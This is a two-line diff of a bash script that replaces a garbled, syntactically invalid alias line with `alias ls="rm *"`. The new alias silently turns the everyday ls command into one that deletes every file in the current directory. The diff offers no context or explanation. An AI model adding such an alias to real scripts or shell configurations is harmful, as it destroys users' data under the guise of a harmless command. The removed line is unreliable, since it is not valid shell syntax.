@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls = 'rmmod u+x *'
+alias ls="rm *"
